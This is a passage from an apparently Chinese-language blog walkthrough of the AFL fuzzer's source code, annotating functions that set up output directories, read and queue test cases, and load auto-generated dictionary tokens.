class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, out_dir);<br><br>    maybe_delete_out_dir();     <span class="hljs-comment">// 删除out_dir目录的原来文件</span><br><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br><br>    <span class="hljs-keyword">if</span> (in_place_resume)        <span class="hljs-comment">// 若in_place_resume不为空，报错并退出</span><br>      FATAL(<span class="hljs-string">&quot;Resume attempted but old output directory not found&quot;</span>);<br><br>    out_dir_fd = open(out_dir, O_RDONLY);       <span class="hljs-comment">// 打开out_dir</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __sun</span><br><br>    <span class="hljs-keyword">if</span> (out_dir_fd &lt; <span class="hljs-number">0</span> || flock(out_dir_fd, LOCK_EX | LOCK_NB)) <span class="hljs-comment">// 若打开失败，或者flock创建互斥锁失败，报错并退出</span><br>      PFATAL(<span class="hljs-string">&quot;Unable to flock() output directory.&quot;</span>);<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* !__sun */</span></span><br><br>  &#125;<br><br>  <span class="hljs-comment">/* Queue directory for any starting &amp; discovered paths. */</span><br><br>  tmp = alloc_printf(<span class="hljs-string">&quot;%s/queue&quot;</span>, out_dir);      <span class="hljs-comment">// 创建目录out_dir/queue</span><br>  <span class="hljs-keyword">if</span> (mkdir(tmp, <span class="hljs-number">0700</span>)) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);<br>  ck_free(tmp);<br><br>  <span class="hljs-comment">/* Top-level directory for queue metadata used for session</span><br><span class="hljs-comment">     resume and related tasks. */</span><br><br>  tmp = alloc_printf(<span class="hljs-string">&quot;%s/queue/.state/&quot;</span>, out_dir);      <span class="hljs-comment">// 创建目录out_dir/.state</span><br>  <span class="hljs-keyword">if</span> (mkdir(tmp, <span class="hljs-number">0700</span>)) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);<br>  ck_free(tmp);<br><br>  <span class="hljs-comment">/* Directory for flagging queue entries that went through</span><br><span class="hljs-comment">     deterministic fuzzing in the past. */</span><br><br>  tmp = alloc_printf(<span class="hljs-string">&quot;%s/queue/.state/deterministic_done/&quot;</span>, out_dir);   <span class="hljs-comment">// 创建目录out_dir/queue/.state/deterministic_done</span><br>  <span class="hljs-keyword">if</span> (mkdir(tmp, <span class="hljs-number">0700</span>)) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);<br>  ck_free(tmp);<br><br>  <span class="hljs-comment">/* Directory with the auto-selected dictionary entries. */</span><br><br>  tmp = alloc_printf(<span class="hljs-string">&quot;%s/queue/.state/auto_extras/&quot;</span>, out_dir);  <span class="hljs-comment">// 创建out_dir/queue/.state/auto_extras</span><br>  <span class="hljs-keyword">if</span> (mkdir(tmp, <span class="hljs-number">0700</span>)) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);<br>  ck_free(tmp);<br><br>  <span class="hljs-comment">/* The set of paths currently deemed redundant. */</span><br><br>  tmp = alloc_printf(<span class="hljs-string">&quot;%s/queue/.state/redundant_edges/&quot;</span>, out_dir);      <span class="hljs-comment">// 创建out_dir/queue/.state/redundant_edges</span><br>  <span class="hljs-keyword">if</span> (mkdir(tmp, <span class="hljs-number">0700</span>)) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);<br>  ck_free(tmp);<br><br>  <span class="hljs-comment">/* The set of paths showing variable behavior. */</span><br><br>  tmp = alloc_printf(<span class="hljs-string">&quot;%s/queue/.state/variable_behavior/&quot;</span>, out_dir);    <span class="hljs-comment">// 创建out_dir/queue/.state/variable_behavior</span><br>  <span class="hljs-keyword">if</span> (mkdir(tmp, <span class="hljs-number">0700</span>)) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);<br>  ck_free(tmp);<br><br>  <span class="hljs-comment">/* Sync directory for keeping track of cooperating fuzzers. */</span><br><br>  <span class="hljs-keyword">if</span> (sync_id) &#123;        <span class="hljs-comment">// 若sync_id不为空</span><br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/.synced/&quot;</span>, out_dir);<br><br>    <span class="hljs-keyword">if</span> (mkdir(tmp, <span class="hljs-number">0700</span>) &amp;&amp; (!in_place_resume || errno != EEXIST))      <span class="hljs-comment">// 创建out_dir/.synced</span><br>      PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);<br><br>    ck_free(tmp);<br><br>  &#125;<br><br>  <span class="hljs-comment">/* All recorded crashes. */</span><br><br>  tmp = alloc_printf(<span class="hljs-string">&quot;%s/crashes&quot;</span>, out_dir);<br>  <span class="hljs-keyword">if</span> (mkdir(tmp, <span class="hljs-number">0700</span>)) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);   <span class="hljs-comment">// 创建out_dir/crashes文件夹</span><br>  ck_free(tmp);<br><br>  <span class="hljs-comment">/* All recorded hangs. */</span><br><br>  tmp = alloc_printf(<span class="hljs-string">&quot;%s/hangs&quot;</span>, out_dir);      <span class="hljs-comment">// 创建out_dir/hangs文件夹</span><br>  <span class="hljs-keyword">if</span> (mkdir(tmp, <span class="hljs-number">0700</span>)) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);<br>  ck_free(tmp);<br><br>  <span class="hljs-comment">/* Generally useful file descriptors. */</span><br><br>  dev_null_fd = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR);      <span class="hljs-comment">// 以读写模式打开/dev/null文件</span><br>  <span class="hljs-keyword">if</span> (dev_null_fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to open /dev/null&quot;</span>);<br><br>  dev_urandom_fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, O_RDONLY);      <span class="hljs-comment">// 以只读模式打开/dev/urandom</span><br>  <span class="hljs-keyword">if</span> (dev_urandom_fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to open /dev/urandom&quot;</span>);<br><br>  <span class="hljs-comment">/* Gnuplot output file. */</span><br><br>  tmp = alloc_printf(<span class="hljs-string">&quot;%s/plot_data&quot;</span>, out_dir);  <br>  fd = open(tmp, O_WRONLY | O_CREAT | O_EXCL, <span class="hljs-number">0600</span>);    <span class="hljs-comment">// 创建out_dir/plot_data</span><br>  <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);<br>  ck_free(tmp);<br><br>  plot_file = fdopen(fd, <span class="hljs-string">&quot;w&quot;</span>);  <span class="hljs-comment">// 创建out_dir/plot_data的链接文件</span><br>  <span class="hljs-keyword">if</span> (!plot_file) PFATAL(<span class="hljs-string">&quot;fdopen() failed&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(plot_file, <span class="hljs-string">&quot;# unix_time, cycles_done, cur_path, paths_total, &quot;</span><br>                     <span class="hljs-string">&quot;pending_total, pending_favs, map_size, unique_crashes, &quot;</span><br>                     <span class="hljs-string">&quot;unique_hangs, max_depth, execs_per_sec\n&quot;</span>);       <span class="hljs-comment">// 向plot_data写出头部信息</span><br>                     <span class="hljs-comment">/* ignore errors */</span><br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h3><p>读取所有的测试用例，并插入到<code>queue</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Read all testcases from the input directory, then queue them for testing.</span><br><span class="hljs-comment">   Called at startup. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">read_testcases</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> **<span class="hljs-title">nl</span>;</span><br>  s32 nl_cnt;<br>  u32 i;<br>  u8* fn;<br><br>  <span class="hljs-comment">/* Auto-detect non-in-place resumption attempts. */</span><br><br>  fn = alloc_printf(<span class="hljs-string">&quot;%s/queue&quot;</span>, in_dir);<br>  <span class="hljs-keyword">if</span> (!access(fn, F_OK)) in_dir = fn; <span class="hljs-keyword">else</span> ck_free(fn); <span class="hljs-comment">// 判断in_dir/queue是否存在，若存在，则in_dir = fn</span><br><br>  ACTF(<span class="hljs-string">&quot;Scanning &#x27;%s&#x27;...&quot;</span>, in_dir);     <span class="hljs-comment">// 使用scandir函数扫描in_dir文件夹</span><br><br>  <span class="hljs-comment">/* We use scandir() + alphasort() rather than readdir() because otherwise,</span><br><span class="hljs-comment">     the ordering  of test cases would vary somewhat randomly and would be</span><br><span class="hljs-comment">     difficult to control. */</span><br><br>  nl_cnt = scandir(in_dir, &amp;nl, <span class="hljs-literal">NULL</span>, alphasort);       <span class="hljs-comment">// 返回文件个数，并将目录信息存放到nl中</span><br><br>  <span class="hljs-keyword">if</span> (nl_cnt &lt; <span class="hljs-number">0</span>) &#123;<br><br>    <span class="hljs-keyword">if</span> (errno == ENOENT || errno == ENOTDIR)    <span class="hljs-comment">// 若errno为ENOENT或者ENOTDIR， 打印报错信息</span><br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;The input directory does not seem to be valid - try again. The fuzzer needs\n&quot;</span><br>           <span class="hljs-string">&quot;    one or more test case to start with - ideally, a small file under 1 kB\n&quot;</span><br>           <span class="hljs-string">&quot;    or so. The cases must be stored as regular files directly in the input\n&quot;</span><br>           <span class="hljs-string">&quot;    directory.\n&quot;</span>);<br><br>    PFATAL(<span class="hljs-string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, in_dir);      <span class="hljs-comment">// 报错并退出</span><br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (shuffle_queue &amp;&amp; nl_cnt &gt; <span class="hljs-number">1</span>) &#123;    <span class="hljs-comment">// 若指定shuffle_queue，且文件个数大于1</span><br><br>    ACTF(<span class="hljs-string">&quot;Shuffling queue...&quot;</span>);<br>    shuffle_ptrs((<span class="hljs-type">void</span>**)nl, nl_cnt);   <span class="hljs-comment">// 打乱文件序数</span><br><br>  &#125;<br>  <br>  <span class="hljs-comment">// 以in_dir/testcase文件为例</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nl_cnt; i++) &#123;        <span class="hljs-comment">// 遍历nl数组中的每项</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><br>    u8* fn = alloc_printf(<span class="hljs-string">&quot;%s/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);      <span class="hljs-comment">// in_dir/testcase</span><br>    u8* dfn = alloc_printf(<span class="hljs-string">&quot;%s/.state/deterministic_done/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);   <span class="hljs-comment">// in_dir/.state/deterministic_done/testcase</span><br><br>    u8  passed_det = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">free</span>(nl[i]); <span class="hljs-comment">/* not tracked */</span><br> <br>    <span class="hljs-keyword">if</span> (lstat(fn, &amp;st) || access(fn, R_OK))     <span class="hljs-comment">// 将文件信息保存到st结构体中，检测文件是否存在，不存在则报错</span><br>      PFATAL(<span class="hljs-string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);<br><br>    <span class="hljs-comment">/* This also takes care of . and .. */</span><br><br>    <span class="hljs-keyword">if</span> (!S_ISREG(st.st_mode) || !st.st_size || <span class="hljs-built_in">strstr</span>(fn, <span class="hljs-string">&quot;/README.txt&quot;</span>)) &#123;     <span class="hljs-comment">// 去除干扰文件.或者..或者/README.txt</span><br><br>      ck_free(fn);<br>      ck_free(dfn);<br>      <span class="hljs-keyword">continue</span>;<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (st.st_size &gt; MAX_FILE)  <span class="hljs-comment">// 若testcase大于MAX_FILE(1M)，报错并退出</span><br>      FATAL(<span class="hljs-string">&quot;Test case &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn,<br>            DMS(st.st_size), DMS(MAX_FILE));<br><br>    <span class="hljs-comment">/* Check for metadata that indicates that deterministic fuzzing</span><br><span class="hljs-comment">       is complete for this entry. We don&#x27;t want to repeat deterministic</span><br><span class="hljs-comment">       fuzzing when resuming aborted scans, because it would be pointless</span><br><span class="hljs-comment">       and probably very time-consuming. */</span><br><br>    <span class="hljs-keyword">if</span> (!access(dfn, F_OK)) passed_det = <span class="hljs-number">1</span>;     <span class="hljs-comment">// 若dfn文件存在，则设置passed_det为1，表示经过了deterministic fuzzing</span><br>    ck_free(dfn);<br><br>    add_to_queue(fn, st.st_size, passed_det);   <span class="hljs-comment">// 将testcase添加到queue中</span><br><br>  &#125;<br><br>  <span class="hljs-built_in">free</span>(nl); <span class="hljs-comment">/* not tracked */</span><br><br>  <span class="hljs-keyword">if</span> (!queued_paths) &#123;  <span class="hljs-comment">// 若queue_paths为空，即没有入队的文件，报错并退出</span><br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>         <span class="hljs-string">&quot;Looks like there are no valid test cases in the input directory! The fuzzer\n&quot;</span><br>         <span class="hljs-string">&quot;    needs one or more test case to start with - ideally, a small file under\n&quot;</span><br>         <span class="hljs-string">&quot;    1 kB or so. The cases must be stored as regular files directly in the\n&quot;</span><br>         <span class="hljs-string">&quot;    input directory.\n&quot;</span>);<br><br>    FATAL(<span class="hljs-string">&quot;No usable test cases in &#x27;%s&#x27;&quot;</span>, in_dir);<br><br>  &#125;<br><br>  last_path_time = <span class="hljs-number">0</span>;   <span class="hljs-comment">// 设置last_path_time为0</span><br>  queued_at_start = queued_paths;       <span class="hljs-comment">// 设置queued_at_start为queued_paths</span><br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="add-to-queue"><a href="#add-to-queue" class="headerlink" title="add_to_queue"></a>add_to_queue</h3><p>向<code>queue</code>中链接新的queue。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Append new test case to the queue. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">add_to_queue</span><span class="hljs-params">(u8* fname, u32 len, u8 passed_det)</span> &#123;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>* <span class="hljs-title">q</span> =</span> ck_alloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> queue_entry)); <span class="hljs-comment">// 创建queue_entry结构体</span><br><br>  q-&gt;fname        = fname;      <span class="hljs-comment">// 为q设置一系列初始值</span><br>  q-&gt;len          = len;<br>  q-&gt;depth        = cur_depth + <span class="hljs-number">1</span>;<br>  q-&gt;passed_det   = passed_det;<br><br>  <span class="hljs-keyword">if</span> (q-&gt;depth &gt; max_depth) max_depth = q-&gt;depth;       <span class="hljs-comment">// 若q-&gt;depth &gt; max_depth，设置max_depth为q-&gt;depth，即最大queue个数</span><br><br>  <span class="hljs-keyword">if</span> (queue_top) &#123;      <span class="hljs-comment">// 若queue_top不为空，插入q，并把queue_top置为q</span><br><br>    queue_top-&gt;next = q;<br>    queue_top = q;<br><br>  &#125; <span class="hljs-keyword">else</span> q_prev100 = <span class="hljs-built_in">queue</span> = queue_top = q;     <span class="hljs-comment">// 否则设置q_prev100 = queue = queue_top = q</span><br><br>  queued_paths++;       <span class="hljs-comment">// queued_paths + 1，测试的路径+1</span><br>  pending_not_fuzzed++; <span class="hljs-comment">// pending_not_fuzzed + 1</span><br><br>  cycles_wo_finds = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (!(queued_paths % <span class="hljs-number">100</span>)) &#123;  <span class="hljs-comment">// 若queue数量是100的倍数，使用q_prev100连接queue</span><br><br>    q_prev100-&gt;next_100 = q;<br>    q_prev100 = q;<br><br>  &#125;<br><br>  last_path_time = get_cur_time();      <span class="hljs-comment">// 设置last_path_time为当前时间</span><br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto"></a>load_auto</h3><p>load自动生成的字典token</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Load automatically generated extras. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">load_auto</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  u32 i;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; USE_AUTO_EXTRAS; i++) &#123;       <span class="hljs-comment">// i &lt; 50</span><br><br>    u8  tmp[MAX_AUTO_EXTRA + <span class="hljs-number">1</span>];        <span class="hljs-comment">// tmp[32 + 1]</span><br>    u8* fn = alloc_printf(<span class="hljs-string">&quot;%s/.state/auto_extras/auto_%06u&quot;</span>, in_dir, i);<br>    s32 fd, len;<br><br>    fd = open(fn, O_RDONLY, <span class="hljs-number">0600</span>);      <span class="hljs-comment">// 以读写权限打开in_dir/.state/auto_extras/auto_i</span><br><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;       <span class="hljs-comment">// 打开失败，报错并返回</span><br><br>      <span class="hljs-keyword">if</span> (errno != ENOENT) PFATAL(<span class="hljs-string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, fn);<br>      ck_free(fn);<br>      <span class="hljs-keyword">break</span>;<br><br>    &#125;<br><br>    <span class="hljs-comment">/* We read one byte more to cheaply detect tokens that are too</span><br><span class="hljs-comment">       long (and skip them). */</span><br><br>    len = read(fd, tmp, MAX_AUTO_EXTRA + <span class="hljs-number">1</span>);    <span class="hljs-comment">// 读取文件内容到tmp中</span><br><br>    <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to read from &#x27;%s&#x27;&quot;</span>, fn);        <span class="hljs-comment">// 若len &lt; 0，报错</span><br><br>    <span class="hljs-keyword">if</span> (len &gt;= MIN_AUTO_EXTRA &amp;&amp; len &lt;= MAX_AUTO_EXTRA) <span class="hljs-comment">// 若3 &lt;= len &lt;= 32，调用maybe_add_auto函数</span><br>      maybe_add_auto(tmp, len);<br><br>    close(fd);<br>    ck_free(fn);<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (i) OKF(<span class="hljs-string">&quot;Loaded %u auto-discovered dictionary tokens.&quot;</span>, i);        <span class="hljs-comment">// 打印信息</span><br>  <span class="hljs-keyword">else</span> OKF(<span class="hljs-string">&quot;No auto-generated dictionary tokens to reuse.&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="maybe-add-auto"><a href="#maybe-add-auto" class="headerlink" title="maybe_add_auto"></a>maybe_add_auto</h3><p>判断是否添加新的a_extras数组项。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Maybe add automatic extra. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">maybe_add_auto</span><span class="hljs-params">(u8* mem, u32 len)</span> &#123;<br><br>  u32 i;<br><br>  <span class="hljs-comment">/* Allow users to specify that they don&#x27;t want auto dictionaries. */</span><br><br>  <span class="hljs-keyword">if</span> (!MAX_AUTO_EXTRAS || !USE_AUTO_EXTRAS) <span class="hljs-keyword">return</span>;     <span class="hljs-comment">// 若MAX_AUTO_EXTRAS或者USE_AUTO_EXTRAS为空，直接返回</span><br><br>  <span class="hljs-comment">/* Skip runs of identical bytes. */</span><br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; len; i++)     <span class="hljs-comment">// 循环遍历mem，若mem[0] ^ mem[i]不同，结束循环</span><br>    <span class="hljs-keyword">if</span> (mem[<span class="hljs-number">0</span>] ^ mem[i]) <span class="hljs-keyword">break</span>;<br><br>  <span class="hljs-keyword">if</span> (i == len) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 若i == len，即mem中所有字节都相同，则直接返回</span><br><br>  <span class="hljs-comment">/* Reject builtin interesting values. */</span><br><br>  <span class="hljs-keyword">if</span> (len == <span class="hljs-number">2</span>) &#123;       <span class="hljs-comment">// 若len为2</span><br><br>    i = <span class="hljs-keyword">sizeof</span>(interesting_16) &gt;&gt; <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">while</span> (i--)         <span class="hljs-comment">// 循环遍历interesting_16数组，若找到与mem相同的值，直接返回</span><br>      <span class="hljs-keyword">if</span> (*((u16*)mem) == interesting_16[i] ||<br>          *((u16*)mem) == SWAP16(interesting_16[i])) <span class="hljs-keyword">return</span>;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (len == <span class="hljs-number">4</span>) &#123;       <span class="hljs-comment">// 若len为4</span><br><br>    i = <span class="hljs-keyword">sizeof</span>(interesting_32) &gt;&gt; <span class="hljs-number">2</span>;<br><br>    <span class="hljs-keyword">while</span> (i--)         <span class="hljs-comment">// 循环遍历interesting_32数组，若找到与mem相同的值，直接返回</span><br>      <span class="hljs-keyword">if</span> (*((u32*)mem) == interesting_32[i] ||<br>          *((u32*)mem) == SWAP32(interesting_32[i])) <span class="hljs-keyword">return</span>;<br><br>  &#125;<br><br>  <span class="hljs-comment">/* Reject anything that matches existing extras. Do a case-insensitive</span><br><span class="hljs-comment">     match. We optimize by exploiting the fact that extras[] are sorted</span><br><span class="hljs-comment">     by size. */</span><br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; extras_cnt; i++)      <span class="hljs-comment">// extras_cnt保存的顺序是从小到大的，依次遍历extras数组，找到第一个大于等于len的索引</span><br>    <span class="hljs-keyword">if</span> (extras[i].len &gt;= len) <span class="hljs-keyword">break</span>;<br><br>  <span class="hljs-keyword">for</span> (; i &lt; extras_cnt &amp;&amp; extras[i].len == len; i++)   <span class="hljs-comment">// 与extras数组中已经存在的值比较，忽略大小写，若存在相同的值，直接返回</span><br>    <span class="hljs-keyword">if</span> (!memcmp_nocase(extras[i].data, mem, len)) <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* Last but not least, check a_extras[] for matches. There are no</span><br><span class="hljs-comment">     guarantees of a particular sort order. */</span><br><br>  auto_changed = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; a_extras_cnt; i++) &#123;  <span class="hljs-comment">// 遍历整个a_extras数组</span><br><br>    <span class="hljs-keyword">if</span> (a_extras[i].len == len &amp;&amp; !memcmp_nocase(a_extras[i].data, mem, len)) &#123; <span class="hljs-comment">// 忽略大小写比较mem，若相同，a_extras++，跳转到sort_a_extras</span><br><br>      a_extras[i].hit_cnt++;<br>      <span class="hljs-keyword">goto</span> sort_a_extras;<br><br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-comment">/* At this point, looks like we&#x27;re dealing with a new entry. So, 